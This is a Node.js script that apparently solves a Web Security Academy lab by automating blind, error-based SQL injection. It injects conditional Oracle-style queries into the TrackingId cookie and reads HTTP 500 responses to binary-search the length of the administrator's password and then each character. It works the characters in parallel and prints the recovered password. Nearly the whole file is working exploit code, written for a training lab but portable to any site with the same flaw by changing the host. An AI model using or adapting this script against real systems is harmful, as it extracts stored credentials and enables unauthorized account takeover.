#!/usr/bin/env node

import { argv, exit } from 'node:process'

const [RESET, RED, GREEN, YELLOW] = [0, 31, 32, 33].map(x => `\x1b[${x}m`)

const padding = 20

const args = argv.slice(2)

if (args.length < 1) {
    console.error(`${RED}No lab ID specified.${RESET}`)
    exit(1)
}

const labId = args[0]
const labHost = `${labId}.web-security-academy.net`
const labUrl = `https://${labHost}`

process.stdout.write('Lab ID :: '.padStart(padding) + `${GREEN}${labId}${RESET}\n`)
process.stdout.write('Lab status :: '.padStart(padding))

let res = await fetch(`https://${labId}.web-security-academy.net`, {})
console.log(`${(res.status==200?GREEN:RED)}${res.statusText}${RESET}`)
if (res.status != 200) exit(1)

process.stdout.write(`${'Password length :: '.padStart(padding)}${YELLOW}~${RESET}`)
let min, max

min = 1, max = 0
while (!max || min < max) {
    let mid = max ? (Math.floor(min + (max - min) / 2)) : (min * 2)
    res = await fetch(labUrl, {
        headers: {'Cookie': `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password) <= ${mid} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'`}
    })
    if (res.status == 200) {
        min = mid + 1
    } else if (res.status == 500) {
        max = mid
    }

    process.stdout.write(`\r${'Password length :: '.padStart(padding)}${YELLOW}`)
    if (max > 0) {
        process.stdout.write(`${min}~${max}`)
    } else {
        process.stdout.write(`${min}~`)
    }
    process.stdout.write(RESET)
}

const passwordLength = min
process.stdout.write(`\x1b[2K\r${'Password length :: '.padStart(padding)}${GREEN}${passwordLength}${RESET}\n`)

let solvers = []
let states = []
for (let i = 0; i < passwordLength; i++)
    states.push({index:i,current:'_',solved:false})

function outputPasswordState() {
    process.stdout.write(
        `\r${'Password :: '.padStart(padding)}`
        + `${states.map(({solved:s,current:v}) => (s?GREEN:YELLOW)+v).join('')}`
        + `${RESET}`
    )
}

async function binarySolve(state) {
    let min, max
    min = 0x20, max = 0x7E
    while (min < max) {
        let attempts = 0
        while (min < max) {
            let mid = Math.floor(min + (max - min) / 2)
            try {
                res = await fetch(labUrl, {
                    headers: {'Cookie': `TrackingId=xyz'||(SELECT CASE WHEN (ASCII(SUBSTR(password, ${state.index+1}, 1)) <= ${mid}) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator')||'`}
                })
            } catch (err) {
                if (attempts++ < 3)
                    continue
                throw err
            }
            if (res.status == 500) {
                max = mid
            } else {
                min = mid + 1
            }
            state.current = String.fromCharCode(mid)
            outputPasswordState()
        }
        state.current = String.fromCharCode(min)
        state.solved = true
        outputPasswordState()
    }
}

for (let i = 0; i < passwordLength; i++)
    solvers.push(binarySolve(states[i]))

await Promise.all(solvers)
outputPasswordState()
process.stdout.write('\n')